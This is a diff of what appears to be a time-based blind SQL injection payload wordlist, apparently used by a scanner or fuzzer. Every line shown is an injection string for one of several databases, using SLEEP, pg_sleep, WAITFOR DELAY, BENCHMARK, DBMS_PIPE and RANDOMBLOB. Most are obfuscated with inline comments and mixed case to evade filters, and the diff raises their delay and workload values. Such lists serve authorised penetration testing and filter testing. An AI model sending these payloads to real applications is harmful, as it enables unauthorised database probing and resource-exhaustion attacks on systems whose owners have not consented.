 '/*azx*/AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))bAKL)/*azx*/AND/*azx*/'vRxe'='vRxe
 '/*azx*/AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))ecMj)--/*azx*/-
 '/*azx*/AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))ecMj)--/*azx*/xx
@@ -352,45 +352,45 @@
 '/*azx*/AND/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/(SELECT(SLEEP(6)))xxqwx)--/*azx*/-
 '/*azx*/AND/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/PG_SLEEP(6))--/*azx*/-
 '/*azx*/AND/*azx*/(select/*azx*/99999999/*azx*/from/*azx*/pg_sleep(15))/*azx*/as/*azx*/test--/*azx*/-
-'/*azx*/AND/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--/*azx*/jfdfk
+'/*azx*/AND/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))--/*azx*/jfdfk
 '/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/ALL_USERS/*azx*/T1,ALL_USERS/*azx*/T2,ALL_USERS/*azx*/T3,ALL_USERS/*azx*/T4,ALL_USERS/*azx*/T5)--/*azx*/bb
 '/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/DOMAIN.DOMAINS/*azx*/AS/*azx*/T1,DOMAIN.COLUMNS/*azx*/AS/*azx*/T2,DOMAIN.TABLES/*azx*/AS/*azx*/T3)--/*azx*/-
-'/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,6000000))--/*azx*/gg--
+'/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,20000000))--/*azx*/gg--
 '/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSIBM.SYSTABLES/*azx*/AS/*azx*/T1,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T2,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T3)--/*azx*/-
 '/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSMASTER:SYSPAGHDR)--/*azx*/j4k3
 '/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)--/*azx*/-
-'/*azx*/AND/*azx*/5=BENCHMARK(6000000,MD5('xxqwx'))--/*azx*/-
+'/*azx*/AND/*azx*/5=BENCHMARK(20000000,MD5('xxqwx'))--/*azx*/-
 '/*azx*/AND/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/-
 '/*azx*/AND/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/-d
 '/*azx*/AND/*azx*/BEGIN/*azx*/IF/*azx*/(5=5)/*azx*/THEN/*azx*/DBMS_LOCK.SLEEP(6);/*azx*/ELSE/*azx*/DBMS_LOCK.SLEEP(0);/*azx*/END/*azx*/IF;/*azx*/END;--/*azx*/uuu
-'/*azx*/AND/*azx*/PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)--/*azx*/-
-'/*azx*/AND/*azx*/RANDOMBLOB(1000000000/2)--/*azx*/-
+'/*azx*/AND/*azx*/PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)--/*azx*/-
+'/*azx*/AND/*azx*/RANDOMBLOB(2000000000/2)--/*azx*/-
 '/*azx*/AND/*azx*/SLEEP(5)--/*azx*/-
 '/*azx*/AND/*azx*/SLEEP(5)/*azx*/AND/*azx*/'1
 '/*azx*/AND/*azx*/WAITFOR/*azx*/DELAY/*azx*/'0:0:6'--/*azx*/-
-'/*azx*/AND/*azx*/benchmark(50000000,MD5(1))--/*azx*/ddd
+'/*azx*/AND/*azx*/benchmark(20000000,MD5(1))--/*azx*/ddd
 '/*azx*/AND/*azx*/pg_SLEEP(5)--/*azx*/c
 '/*azx*/AND/*azx*/waitfor/*azx*/delay/*azx*/'00:00:05
 '/*azx*/AND/*azx*/waitfor/*azx*/delay/*azx*/'00:00:05'#/*azx*/dd
 '/*azx*/AND/*azx*/waitfor/*azx*/delay/*azx*/'00:00:05'--/*azx*/-d
-'/*azx*/OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)--/*azx*/rheu
-'/*azx*/OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/-wfewf
-'/*azx*/OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/fiuif
+'/*azx*/OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)--/*azx*/rheu
+'/*azx*/OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/-wfewf
+'/*azx*/OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/fiuif
 '/*azx*/OR/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))ecMj)--
 '/*azx*/OR/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/(SELECT(SLEEP(6)))xxqwx)
-'/*azx*/OR/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,6000000))--/*azx*/-
+'/*azx*/OR/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,20000000))--/*azx*/-
 '/*azx*/OR/*azx*/(select/*azx*/99999999/*azx*/from/*azx*/pg_sleep(15))--/*azx*/-jfhjsdhfj
-'/*azx*/OR/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--/*azx*/jurewr
+'/*azx*/OR/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))--/*azx*/jurewr
 '/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/ALL_USERS/*azx*/T1,ALL_USERS/*azx*/T2,ALL_USERS/*azx*/T3,ALL_USERS/*azx*/T4,ALL_USERS/*azx*/T5)--/*azx*/-w
 '/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/DOMAIN.DOMAINS/*azx*/AS/*azx*/T1,DOMAIN.COLUMNS/*azx*/AS/*azx*/T2,DOMAIN.TABLES/*azx*/AS/*azx*/T3)--/*azx*/a
 '/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSIBM.SYSTABLES/*azx*/AS/*azx*/T1,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T2,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T3)--/*azx*/-
 '/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)--/*azx*/-xxx
-'/*azx*/OR/*azx*/5=BENCHMARK(6000000,MD5('xxqwx'))
+'/*azx*/OR/*azx*/5=BENCHMARK(20000000,MD5('xxqwx'))
 '/*azx*/OR/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/ee
 '/*azx*/OR/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/fsd
-'/*azx*/OR/*azx*/RANDOMBLOB(500000000/2)--/*azx*/-
+'/*azx*/OR/*azx*/RANDOMBLOB(200000000/2)--/*azx*/-
 '/*azx*/OR/*azx*/SLEEP(6)#/*azx*/fdfdf
-'/*azx*/PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)--/*azx*/-
+'/*azx*/PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)--/*azx*/-
 '/*azx*/SLEEP(5)--
 '/*azx*/SLEEP(5)='
 '/*azx*/XOR(if(now()=sysdate(),sleep(5*5),0))OR--/*azx*/-
@@ -398,9 +398,9 @@
 '/*azx*/XOR(if(now()=sysdate(),sleep(5*5*0),0))OR/*azx*/'
 '/*azx*/or/*azx*/SLEEP(5)--/*azx*/tt
 '/*azx*/or/*azx*/SLEEP(5)='
-'/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-'/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
-'/*azx*/or/*azx*/benchmark(50000000,MD5(1))--
+'/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+'/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
+'/*azx*/or/*azx*/benchmark(20000000,MD5(1))--
 '/*azx*/or/*azx*/pg_sleep(5)#/*azx*/--
 '/*azx*/or/*azx*/pg_sleep(5)--
 '/*azx*/or/*azx*/sleep(5)#
@@ -427,29 +427,29 @@
 '||pg_sleep(10)--/*azx*/-
 (5=5 AND SLEEP(6))
 (5=5/*azx*/AND/*azx*/SLEEP(6))
-(CASE WHEN (5=5) THEN (SELECT BENCHMARK(6000000,MD5('xxqwx'))) ELSE 5)
+(CASE WHEN (5=5) THEN (SELECT BENCHMARK(20000000,MD5('xxqwx'))) ELSE 5)
 (CASE WHEN (5=5) THEN SLEEP(6) ELSE 5 END)
-(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/BENCHMARK(6000000,MD5('xxqwx')))/*azx*/ELSE/*azx*/5)
+(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/BENCHMARK(20000000,MD5('xxqwx')))/*azx*/ELSE/*azx*/5)
 (CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/SLEEP(6)/*azx*/ELSE/*azx*/5/*azx*/END)
 (SELECT 5 FROM (SELECT(SLEEP(6)))xxqwx)
 (SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
 (SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
 (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
 (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- 878rew
-(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2)))))
+(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))))
 (SELECT/*azx*/5/*azx*/FROM/*azx*/(SELECT(SLEEP(6)))xxqwx)
 (SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/DOMAIN.DOMAINS/*azx*/AS/*azx*/T1,DOMAIN.COLUMNS/*azx*/AS/*azx*/T2,DOMAIN.TABLES/*azx*/AS/*azx*/T3)
 (SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/RDB$FIELDS/*azx*/AS/*azx*/T1,RDB$TYPES/*azx*/AS/*azx*/T2,RDB$COLLATIONS/*azx*/AS/*azx*/T3,RDB$FUNCTIONS/*azx*/AS/*azx*/T4)
 (SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSIBM.SYSTABLES/*azx*/AS/*azx*/T1,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T2,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T3)
 (SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSMASTER:SYSPAGHDR)--/*azx*/878rew
-(SELECT/*azx*/LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2)))))
+(SELECT/*azx*/LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))))
 (select 9999999999999999 from pg_sleep(10))
 (select 9999999999999999 from pg_sleep(10)) as test
 (select 99999999999999999 from pg_sleep(15))
 (select 99999999999999999 from pg_sleep(15)) as test
-(select benchmark(15000000,md5(0x4e446b6e))-9999) as test-- 
-(select benchmark(15000000,md5(0x4e446b6e))-99999999) as test
-(select benchmark(150000000,md5(0x4e446b6e))-99999999) as test
+(select benchmark(20000000,md5(0x4e446b6e))-9999) as test-- 
+(select benchmark(20000000,md5(0x4e446b6e))-99999999) as test
+(select benchmark(200000000,md5(0x4e446b6e))-99999999) as test
 (select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)
 (select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test
 (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)
@@ -465,13 +465,13 @@
 (select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) as test
 (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
 (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) as test
-(select like('abcdefg',upper(hex(randomblob(150000000)))))
-(select like('abcdefg',upper(hex(randomblob(150000000))))) as test
-(select like('abcdefg',upper(hex(randomblob(150000000)))))-- -
+(select like('abcdefg',upper(hex(randomblob(200000000)))))
+(select like('abcdefg',upper(hex(randomblob(200000000))))) as test
+(select like('abcdefg',upper(hex(randomblob(200000000)))))-- -
 (select/*azx*/9999999999999999/*azx*/from/*azx*/pg_sleep(10))
 (select/*azx*/9999999999999999/*azx*/from/*azx*/pg_sleep(10))/*azx*/as/*azx*/test
-(select/*azx*/benchmark(15000000,md5(0x4e446b6e))-9999)/*azx*/as/*azx*/test--/*azx*/
-(select/*azx*/benchmark(15000000,md5(0x4e446b6e))-99999999)/*azx*/as/*azx*/test
+(select/*azx*/benchmark(20000000,md5(0x4e446b6e))-9999)/*azx*/as/*azx*/test--/*azx*/
+(select/*azx*/benchmark(20000000,md5(0x4e446b6e))-99999999)/*azx*/as/*azx*/test
 (select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)
 (select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)/*azx*/as/*azx*/test
 (select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)/*azx*/as/*azx*/test--/*azx*/-
@@ -485,13 +485,13 @@
 (select/*azx*/count(*)/*azx*/from/*azx*/sysibm.systables/*azx*/as/*azx*/t1,sysibm.systables/*azx*/as/*azx*/t2,sysibm.systables/*azx*/as/*azx*/t3)/*azx*/as/*azx*/test
 (select/*azx*/count(*)/*azx*/from/*azx*/sysusers/*azx*/as/*azx*/sys1,sysusers/*azx*/as/*azx*/sys2,sysusers/*azx*/as/*azx*/sys3,sysusers/*azx*/as/*azx*/sys4,sysusers/*azx*/as/*azx*/sys5,sysusers/*azx*/as/*azx*/sys6,sysusers/*azx*/as/*azx*/sys7)
 (select/*azx*/count(*)/*azx*/from/*azx*/sysusers/*azx*/as/*azx*/sys1,sysusers/*azx*/as/*azx*/sys2,sysusers/*azx*/as/*azx*/sys3,sysusers/*azx*/as/*azx*/sys4,sysusers/*azx*/as/*azx*/sys5,sysusers/*azx*/as/*azx*/sys6,sysusers/*azx*/as/*azx*/sys7)/*azx*/as/*azx*/test
-(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))
-(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))--/*azx*/-
-(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))/*azx*/as/*azx*/test
+(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))
+(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))--/*azx*/-
+(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))/*azx*/as/*azx*/test
 ) AND (SELECT 7170 FROM (SELECT(SLEEP(20)))1337) AND (4781=4781
 ) AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND (5431=5431
-) or benchmark(10000000,MD5(1))#
-) or benchmark(10000000,MD5(1))-- -
+) or benchmark(20000000,MD5(1))#
+) or benchmark(20000000,MD5(1))-- -
 ) or pg_sleep(5)# --
 ) or pg_sleep(5)--
 ) or sleep(5)#
@@ -501,7 +501,7 @@
 )) AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND ((5431=5431
 )) AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND ((6598=6598
 )) WAITFOR DELAY '0:0:20' AND ((6821=6821
-)) or benchmark(10000000,MD5(1))#
+)) or benchmark(20000000,MD5(1))#
 )) or pg_sleep(5)--
 )) or sleep(5)#
 )) waitfor delay '0:0:5' -- fdf
@@ -522,7 +522,7 @@
 ))))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
 )))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*/--/*azx*/dfd
 )))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
-))/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
+))/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
 ))/*azx*/or/*azx*/pg_sleep(5)--
 ))/*azx*/or/*azx*/sleep(5)#
 ))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*/--/*azx*/fdf
@@ -537,8 +537,8 @@
 )/*any*/And/*any*/3065=DBMS_PIPE.ReCeIve_MeSSAgE(cHR(111)||cHR(83)||cHR(81)||cHR(81),20)/*any*/And/*any*/(4337/*any*/BEtweEN/*any*/4337/*any*/And/*any*/4337
 )/*any*/WAITFOR/*any*/DELAY/*any*/'0:0:20'/*any*/aNd/*any*/(8069/*any*/BETwEeN/*any*/8069/*any*/aNd/*any*/8069
 )/*any*/aND/*any*/8023=(SElECT/*any*/8023/*any*/FRoM/*any*/pG_sleEP(20))/*any*/aND/*any*/(4606/*any*/BETweeN/*any*/4606/*any*/aND/*any*/4606
-)/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-)/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
+)/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+)/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
 )/*azx*/or/*azx*/pg_sleep(5)#/*azx*/--
 )/*azx*/or/*azx*/pg_sleep(5)--
 )/*azx*/or/*azx*/sleep(5)#
@@ -550,21 +550,21 @@
 +/*azx*/SLEEP(10)/*azx*/+/*azx*/'
 ,(BEGIN IF (5=5) THEN DBMS_LOCK.SLEEP(6); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)
 ,(BEGIN/*azx*/IF/*azx*/(5=5)/*azx*/THEN/*azx*/DBMS_LOCK.SLEEP(6);/*azx*/ELSE/*azx*/DBMS_LOCK.SLEEP(0);/*azx*/END/*azx*/IF;/*azx*/END;)
-,(SELECT (CASE WHEN (5=5) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL))) ELSE 5/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
-,(SELECT (CASE WHEN (5=5) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),600000000),NULL))) ELSE 5/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
+,(SELECT (CASE WHEN (5=5) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL))) ELSE 5/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
+,(SELECT (CASE WHEN (5=5) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),2000000000),NULL))) ELSE 5/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
 ,(SELECT (CASE WHEN (5=5) THEN (SELECT 5 FROM PG_SLEEP(6)) ELSE 1/(SELECT 0) END))-- -
-,(SELECT (CASE WHEN (5=5) THEN (SELECT BENCHMARK(6000000,MD5('xxqwx'))) ELSE 5*(SELECT 5 FROM mysql.db) END))
+,(SELECT (CASE WHEN (5=5) THEN (SELECT BENCHMARK(20000000,MD5('xxqwx'))) ELSE 5*(SELECT 5 FROM mysql.db) END))
 ,(SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
-,(SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,6000000)) ELSE 1/(SELECT 0) END))
+,(SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000)) ELSE 1/(SELECT 0) END))
 ,(SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 5*(SELECT 5 UNION ALL SELECT 3422) END))-- -
 ,(SELECT (CASE WHEN (5=5) THEN DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
 ,(SELECT (CASE WHEN (5=5) THEN SLEEP(6) ELSE 5 END))-- -
-,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)))/*azx*/ELSE/*azx*/5/(SELECT/*azx*/0/*azx*/FROM/*azx*/(VALUES(0)))/*azx*/END)/*azx*/FROM/*azx*/(VALUES(0)))
-,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),600000000),NULL)))/*azx*/ELSE/*azx*/5/(SELECT/*azx*/0/*azx*/FROM/*azx*/INFORMATION_SCHEMA.SYSTEM_USERS)/*azx*/END)/*azx*/FROM/*azx*/INFORMATION_SCHEMA.SYSTEM_USERS)
+,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)))/*azx*/ELSE/*azx*/5/(SELECT/*azx*/0/*azx*/FROM/*azx*/(VALUES(0)))/*azx*/END)/*azx*/FROM/*azx*/(VALUES(0)))
+,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),2000000000),NULL)))/*azx*/ELSE/*azx*/5/(SELECT/*azx*/0/*azx*/FROM/*azx*/INFORMATION_SCHEMA.SYSTEM_USERS)/*azx*/END)/*azx*/FROM/*azx*/INFORMATION_SCHEMA.SYSTEM_USERS)
 ,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/PG_SLEEP(6))/*azx*/ELSE/*azx*/1/(SELECT/*azx*/0)/*azx*/END))--/*azx*/-
-,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/BENCHMARK(6000000,MD5('xxqwx')))/*azx*/ELSE/*azx*/5*(SELECT/*azx*/5/*azx*/FROM/*azx*/mysql.db)/*azx*/END))
+,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/BENCHMARK(20000000,MD5('xxqwx')))/*azx*/ELSE/*azx*/5*(SELECT/*azx*/5/*azx*/FROM/*azx*/mysql.db)/*azx*/END))
 ,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/ALL_USERS/*azx*/T1,ALL_USERS/*azx*/T2,ALL_USERS/*azx*/T3,ALL_USERS/*azx*/T4,ALL_USERS/*azx*/T5)/*azx*/ELSE/*azx*/1/(SELECT/*azx*/0/*azx*/FROM/*azx*/DUAL)/*azx*/END)/*azx*/FROM/*azx*/DUAL)--/*azx*/-
-,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,6000000))/*azx*/ELSE/*azx*/1/(SELECT/*azx*/0)/*azx*/END))
+,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,20000000))/*azx*/ELSE/*azx*/1/(SELECT/*azx*/0)/*azx*/END))
 ,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)/*azx*/ELSE/*azx*/5*(SELECT/*azx*/5/*azx*/UNION/*azx*/ALL/*azx*/SELECT/*azx*/3422)/*azx*/END))--/*azx*/-
 ,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)/*azx*/ELSE/*azx*/1/(SELECT/*azx*/0/*azx*/FROM/*azx*/DUAL)/*azx*/END)/*azx*/FROM/*azx*/DUAL)
 ,(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/SLEEP(6)/*azx*/ELSE/*azx*/5/*azx*/END))--/*azx*/-
@@ -590,45 +590,45 @@
 /*any*/aND/*any*/3065/*any*/betWEen/*any*/DBMS_PIPE/*any*/aND/*any*/DBMS_PIPE.rEcEIVE_mESSAGE(ChR(111)||ChR(83)||ChR(81)||ChR(81),20)
